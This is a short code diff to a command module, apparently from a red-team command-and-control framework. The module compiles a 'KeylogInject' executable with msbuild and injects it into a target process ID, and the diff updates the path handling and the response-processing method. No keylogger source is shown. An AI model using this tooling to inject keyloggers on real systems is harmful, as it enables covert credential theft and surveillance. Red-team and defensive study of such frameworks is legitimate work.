@@ -53,7 +53,7 @@ class KeylogInjectCommand(CommandBase):
         agent_build_path = tempfile.TemporaryDirectory()            
         outputPath = "{}/KeylogInject/bin/Release/KeylogInject.exe".format(agent_build_path.name)
             # shutil to copy payload files over
-        copy_tree(self.agent_code_path, agent_build_path.name)
+        copy_tree(str(self.agent_code_path), agent_build_path.name)
         shell_cmd = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release {}/KeylogInject/KeylogInject.csproj".format(agent_build_path.name)
         proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                          stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
@@ -96,5 +96,6 @@ class KeylogInjectCommand(CommandBase):
         task.display_params = "-PID {}".format(task.args.get_arg("pid"))
         return task
 
-    async def process_response(self, response: AgentResponse):
-        pass
+    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
+        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
+        return resp
